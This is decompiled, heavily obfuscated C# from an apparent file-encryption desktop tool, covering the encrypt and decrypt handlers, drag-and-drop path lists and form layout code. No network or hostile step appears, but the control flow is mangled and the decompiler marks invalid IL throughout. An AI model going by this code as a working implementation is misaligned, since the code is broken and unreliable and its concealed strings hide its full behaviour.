				stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
				goto case 3;
			default:
				num2 = 3;
				if (true)
				{
					goto IL_002a;
				}
				goto case 2;
			case 2:
			case 9:
				stateMachine.sender = _0020;
				num2 = 1;
				if (0 == 0)
				{
					goto IL_002a;
				}
				goto case 1;
			case 1:
				stateMachine.e = _0020;
				num2 = 0;
				if (0 == 0)
				{
					goto IL_002a;
				}
				goto case 3;
			case 3:
				stateMachine._003C_003E1__state = -1;
				break;
			case 6:
			case 7:
				break;
			case 8:
				stateMachine._003C_003E4__this = this;
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num3 = 7;
					goto IL_0026;
				}
				num2 = 9;
				if (0 == 0)
				{
					goto IL_002a;
				}
				goto case 4;
			case 4:
				_003C_003Et__builder.Start(ref stateMachine);
				num3 = 10;
				goto IL_0026;
			case 5:
				stateMachine = new _003CbtnEncrypt_Click_003Ed__6();
				num2 = 8;
				goto IL_002a;
			case 10:
				return;
				IL_0026:
				num2 = num3;
				goto IL_002a;
				IL_002a:
				num = num2;
				continue;
			}
			_003C_003Et__builder = stateMachine._003C_003Et__builder;
			num = 4;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CbtnDecrypt_Click_003Ed__7))]
	private void btnDecrypt_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00ce
		//IL_0006: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 5;
			goto IL_00db;
		}
		int num2 = 9;
		goto IL_00d7;
		IL_00d7:
		num = num2;
		goto IL_00db;
		IL_00db:
		_003CbtnDecrypt_Click_003Ed__7 stateMachine = default(_003CbtnDecrypt_Click_003Ed__7);
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		while (true)
		{
			switch (num)
			{
			case 0:
			case 5:
				stateMachine = new _003CbtnDecrypt_Click_003Ed__7();
				num2 = 4;
				if (true)
				{
					break;
				}
				goto case 7;
			case 7:
				stateMachine.e = _0020;
				num = 2;
				continue;
			case 6:
			case 9:
				_003C_003Et__builder = stateMachine._003C_003Et__builder;
				num2 = 3;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					break;
				}
				goto case 7;
			case 8:
				stateMachine._003C_003E1__state = -1;
				goto case 6;
			case 1:
				stateMachine.sender = _0020;
				num = 7;
				continue;
			case 3:
				_003C_003Et__builder.Start(ref stateMachine);
				num2 = 10;
				break;
			case 4:
				stateMachine._003C_003E4__this = this;
				num2 = 1;
				break;
			case 2:
				stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
				goto case 8;
			default:
				num = 8;
				continue;
			case 10:
				return;
			}
			break;
		}
		goto IL_00d7;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void lblInfo_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		Process.Start(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2004));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void lstPaths_DragDrop(object _0020, DragEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_005e, IL_0106
		//IL_0006: Incompatible stack heights: 0 vs 1
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 3;
			goto IL_0063;
		}
		int num2 = 5;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_0067;
		}
		goto IL_00c6;
		IL_00c6:
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
				switch (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 3 : 2)
				{
				case 0:
				case 2:
					lstPaths.get_Items().Add((object)current);
					break;
				}
			}
			return;
		}
		finally
		{
			enumerator?.Dispose();
		}
		IL_0063:
		num2 = num;
		goto IL_0067;
		IL_0067:
		int num3 = num2;
		IEnumerable<string> enumerable = default(IEnumerable<string>);
		object data = default(object);
		bool flag = default(bool);
		while (true)
		{
			switch (num3)
			{
			case 1:
			case 5:
				enumerable = data as IEnumerable<string>;
				num = 6;
				goto IL_0063;
			case 2:
				if (flag)
				{
					num3 = 4;
					continue;
				}
				return;
			case 4:
				enumerator = enumerable.GetEnumerator();
				num = 7;
				goto IL_0063;
			case 6:
				flag = enumerable != null;
				goto case 2;
			default:
				num = 2;
				goto IL_0063;
			case 0:
			case 3:
				data = _0020.get_Data().GetData(DataFormats.FileDrop, false);
				goto case 1;
			case 7:
				break;
			}
			break;
		}
		goto IL_00c6;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void lstPaths_DragEnter(object _0020, DragEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_001d
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_008c: Incompatible stack heights: 0 vs 1
		int num = 4;
		bool dataPresent = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 0:
				case 2:
					_0020.set_Effect((DragDropEffects)1);
					return;
				default:
					return;
				case 1:
					return;
				case 5:
					if (!dataPresent)
					{
						_0020.set_Effect((DragDropEffects)0);
						num2 = 6;
						continue;
					}
					_ = 0;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 1;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							break;
						}
						goto case 0;
					}
					num2 = 0;
					continue;
				case 4:
					dataPresent = _0020.get_Data().GetDataPresent(DataFormats.FileDrop);
					num = 5;
					if (false)
					{
						return;
					}
					break;
				case 6:
					return;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void lstPaths_SelectedIndexChanged(object _0020, EventArgs _0020)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	private void gbPaths_Enter(object _0020, EventArgs _0020)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void Dispose(bool _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0072
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		while (true)
		{
			int num2;
			switch (num)
			{
			case 1:
				if (components != null)
				{
					_ = 0;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 5;
						continue;
					}
					num2 = 4;
					break;
				}
				goto default;
			default:
				((Form)this).Dispose(_0020);
				num2 = 6;
				break;
			case 0:
				if (_0020)
				{
					num2 = 1;
					break;
				}
				goto default;
			case 2:
			case 5:
				components.Dispose();
				goto default;
			case 6:
				return;
			}
			int num3 = num2;
			num = num3;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitializeComponent()
	{
		//Discarded unreachable code: IL_0005, IL_1141
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		//IL_028e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_04c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cf: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05dd: Expected O, but got Unknown
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0646: Expected O, but got Unknown
		//IL_0667: Unknown result type (might be due to invalid IL or missing references)
		//IL_0671: Expected O, but got Unknown
		//IL_06a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06aa: Expected O, but got Unknown
		//IL_08da: Unknown result type (might be due to invalid IL or missing references)
		//IL_08e4: Expected O, but got Unknown
		//IL_0abd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac7: Expected O, but got Unknown
		//IL_0cd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce2: Expected O, but got Unknown
		//IL_0db7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc1: Expected O, but got Unknown
		//IL_0dd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ddb: Expected O, but got Unknown
		//IL_0f70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7a: Expected O, but got Unknown
		//IL_0fef: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff9: Expected O, but got Unknown
		//IL_1430: Unknown result type (might be due to invalid IL or missing references)
		//IL_143a: Expected O, but got Unknown
		//IL_1660: Unknown result type (might be due to invalid IL or missing references)
		//IL_166a: Expected O, but got Unknown
		//IL_1695: Unknown result type (might be due to invalid IL or missing references)
		//IL_169f: Expected O, but got Unknown
		//IL_1792: Incompatible stack heights: 0 vs 1
		//IL_181d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1827: Expected O, but got Unknown
		//IL_1828: Unknown result type (might be due to invalid IL or missing references)
		//IL_1832: Expected O, but got Unknown
		//IL_1880: Unknown result type (might be due to invalid IL or missing references)
		//IL_188a: Expected O, but got Unknown
		int num = 2;
		ComponentResourceManager componentResourceManager = default(ComponentResourceManager);
		while (true)
		{
			int num2;
			int num3;
			switch (num)
			{
			case 110:
				((Control)txtPassword).set_Font(new Font(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2116), 12f, (FontStyle)1));
				num2 = 21;
				goto IL_114a;
			case 161:
				((Control)lblInfo).set_Dock((DockStyle)2);
				((Control)lblInfo).set_ForeColor(SystemColors.ControlDarkDark);
				num = 9;
				break;
			case 119:
				txtPassword = new TextBox();
				num2 = 100;
				goto IL_114a;
			case 59:
				((Control)gbPaths).set_TabIndex(0);
				num = 35;
				break;
			case 86:
				((Control)btnDecrypt).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2136));
				num2 = 55;
				if (false)
				{
					goto case 101;
				}
				goto IL_114a;
			case 101:
				((Control)gbOptions).get_Controls().Add((Control)(object)lstExts);
				num2 = 7;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 4;
				}
				goto IL_114a;
			case 4:
				((Control)gbLog).PerformLayout();
				((Control)this).ResumeLayout(false);
				num2 = 168;
				if (1 == 0)
				{
					goto case 83;
				}
				goto IL_114a;
			case 83:
				lstPaths = new ListBox();
				num3 = 152;
				goto IL_1146;
			case 73:
				((Form)this).set_ClientSize(new Size(428, 472));
				num2 = 1;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 152;
				}
				goto IL_114a;
			case 162:
				((Control)btnEncrypt).set_Size(new Size(163, 41));
				num2 = 29;
				goto IL_114a;
			case 13:
				((TextBoxBase)txtLog).set_WordWrap(false);
				((Control)this).set_AllowDrop(true);
				num2 = 63;
				if (false)
				{
					goto case 26;
				}
				goto IL_114a;
			case 26:
				((Control)this).get_Controls().Add((Control)(object)gbOptions);
				num3 = 24;
				goto IL_1146;
			case 136:
				((Control)gbPaths).get_Controls().Add((Control)(object)btnAddFolder);
				num2 = 129;
				goto IL_114a;
			case 104:
				((Control)gbOptions).get_Controls().Add((Control)(object)label1);
				num = 101;
				break;
			case 23:
				((Control)txtLog).set_Location(new Point(3, 16));
				num2 = 18;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 131;
				}
				goto IL_114a;
			case 56:
				((Control)chkDeleteOrg).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2100));
				num2 = 166;
				goto IL_114a;
			case 128:
				((Control)btnAddFolder).set_Size(new Size(75, 23));
				num = 159;
				break;
			case 40:
				lstPaths.add_SelectedIndexChanged((EventHandler)lstPaths_SelectedIndexChanged);
				((Control)lstPaths).add_DragDrop(new DragEventHandler(lstPaths_DragDrop));
				num2 = 62;
				goto IL_114a;
			case 95:
				((ButtonBase)btnEncrypt).set_UseVisualStyleBackColor(true);
				num3 = 143;
				goto IL_1146;
			case 21:
				((Control)txtPassword).set_Location(new Point(3, 16));
				((Control)txtPassword).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2120));
				num = 49;
				break;
			case 100:
				btnEncrypt = new Button();
				num3 = 71;
				goto IL_1146;
			case 163:
				((Control)gbPassword).ResumeLayout(false);
				num = 139;
				break;
			case 113:
				((Control)gbPassword).SuspendLayout();
				num2 = 84;
				goto IL_114a;
			case 131:
				((Control)gbPaths).set_Size(new Size(404, 130));
				num2 = 59;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 167;
				}
				goto IL_114a;
			case 149:
				((TextBoxBase)txtLog).set_ReadOnly(true);
				num = 105;
				break;
			case 43:
				((Control)btnDecrypt).set_TabIndex(4);
				num2 = 86;
				if (false)
				{
					goto case 123;
				}
				goto IL_114a;
			case 123:
				((Form)this).set_MaximizeBox(false);
				num2 = 45;
				goto IL_114a;
			case 82:
				((Control)txtPassword).set_Dock((DockStyle)5);
				num2 = 110;
				goto IL_114a;
			case 130:
				((Control)lstExts).set_TabIndex(2);
				num2 = 64;
				goto IL_114a;
			case 19:
				((Control)gbLog).get_Controls().Add((Control)(object)txtLog);
				num2 = 48;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 155;
				}
				goto IL_114a;
			case 155:
				((Control)btnDecrypt).add_Click((EventHandler)btnDecrypt_Click);
				num2 = 161;
				goto IL_114a;
			case 45:
				((Control)this).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2160));
				num3 = 65;
				goto IL_1146;
			case 51:
				((Control)this).SuspendLayout();
				num2 = 167;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 103;
				}
				goto IL_114a;
			case 159:
				((Control)btnAddFolder).set_TabIndex(2);
				num2 = 85;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 116;
				}
				goto IL_114a;
			case 116:
				((Control)txtLog).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2156));
				num3 = 149;
				goto IL_1146;
			case 17:
				((Form)this).set_Icon((Icon)componentResourceManager.GetObject(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(408)));
				num2 = 123;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 30;
				}
				goto IL_114a;
			case 16:
				((Control)chkDeleteOrg).set_AutoSize(true);
				num3 = 75;
				goto IL_1146;
			case 132:
				((Control)gbLog).set_TabIndex(6);
				num2 = 66;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_114a;
				}
				goto case 118;
			case 6:
				((Control)txtLog).set_Dock((DockStyle)5);
				num = 23;
				break;
			case 10:
				((Control)gbPaths).set_Location(new Point(12, 12));
				((Control)gbPaths).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2008));
				num3 = 131;
				goto IL_1146;
			case 31:
				((Control)chkSubFolders).set_Size(new Size(115, 17));
				((Control)chkSubFolders).set_TabIndex(1);
				num2 = 57;
				goto IL_114a;
			case 124:
				((Control)this).get_Controls().Add((Control)(object)gbPassword);
				num = 26;
				break;
			case 42:
				gbOptions.set_TabStop(false);
				num = 141;
				break;
			case 98:
				chkSubFolders = new CheckBox();
				num3 = 150;
				goto IL_1146;
			case 109:
				((Control)gbLog).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2148));
				num2 = 121;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 64;
				}
				goto IL_114a;
			case 33:
				((Control)btnEncrypt).set_Location(new Point(12, 287));
				num2 = 12;
				goto IL_114a;
			case 122:
				gbPassword = new GroupBox();
				num3 = 119;
				goto IL_1146;
			case 153:
				((Control)btnDecrypt).set_Font(new Font(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2116), 8f, (FontStyle)1));
				num2 = 140;
				goto IL_114a;
			case 68:
				((Control)btnAddFile).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2032));
				num = 96;
				break;
			case 150:
				chkDeleteOrg = new CheckBox();
				num2 = 122;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_114a;
				}
				goto case 160;
			case 57:
				((Control)chkSubFolders).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2096));
				num3 = 164;
				goto IL_1146;
			case 44:
				lstExts.get_Items().AddRange(new object[7]
				{
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2060),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2064),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2068),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2072),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2076),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2080),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2084)
				});
				num3 = 147;
				goto IL_1146;
			case 85:
				((Control)btnAddFolder).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2028));
				((ButtonBase)btnAddFolder).set_UseVisualStyleBackColor(true);
				((Control)btnAddFolder).add_Click((EventHandler)btnAddFolder_Click);
				num2 = 118;
				goto IL_114a;
			case 94:
				((Control)gbPassword).set_TabIndex(2);
				num3 = 160;
				goto IL_1146;
			case 63:
				((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
				num3 = 127;
				goto IL_1146;
			case 105:
				txtLog.set_ScrollBars((ScrollBars)3);
				num2 = 50;
				if (false)
				{
					goto case 91;
				}
				goto IL_114a;
			case 91:
				((Control)gbPaths).get_Controls().Add((Control)(object)lstPaths);
				num2 = 10;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 103;
				}
				goto IL_114a;
			case 103:
				((Control)gbOptions).set_TabIndex(1);
				num = 42;
				break;
			case 37:
				((ButtonBase)chkDeleteOrg).set_UseVisualStyleBackColor(true);
				num = 126;
				break;
			case 147:
				((Control)lstExts).set_Location(new Point(277, 40));
				num2 = 70;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 14;
				}
				goto IL_114a;
			case 14:
				((Control)gbOptions).get_Controls().Add((Control)(object)chkDeleteOrg);
				num2 = 77;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 144;
				}
				goto IL_114a;
			case 3:
				((Control)gbPaths).ResumeLayout(false);
				num3 = 154;
				goto IL_1146;
			case 84:
				((Control)gbLog).SuspendLayout();
				num = 51;
				break;
			case 34:
				label1 = new Label();
				num2 = 54;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 30;
				}
				goto IL_114a;
			case 151:
				((Control)lstPaths).set_Location(new Point(6, 19));
				num2 = 78;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 49;
				}
				goto IL_114a;
			case 49:
				txtPassword.set_PasswordChar('*');
				num3 = 60;
				goto IL_1146;
			case 165:
				((Control)gbOptions).SuspendLayout();
				num3 = 113;
				goto IL_1146;
			case 81:
				((Control)gbLog).ResumeLayout(false);
				num = 4;
				break;
			case 89:
				((Control)gbPassword).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2108));
				((Control)gbPassword).set_Size(new Size(404, 48));
				num2 = 94;
				goto IL_114a;
			case 50:
				((Control)txtLog).set_Size(new Size(395, 96));
				num3 = 39;
				goto IL_1146;
			case 135:
				lblInfo.set_TextAlign((ContentAlignment)32);
				num2 = 8;
				if (false)
				{
					goto case 80;
				}
				goto IL_114a;
			case 80:
				((ListControl)lstPaths).set_FormattingEnabled(true);
				num3 = 88;
				goto IL_1146;
			case 38:
				((Control)gbPassword).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2112));
				num2 = 82;
				if (false)
				{
					goto case 156;
				}
				goto IL_114a;
			case 156:
				((Control)gbPaths).SuspendLayout();
				num2 = 165;
				goto IL_114a;
			case 39:
				((Control)txtLog).set_TabIndex(0);
				num3 = 13;
				goto IL_1146;
			case 74:
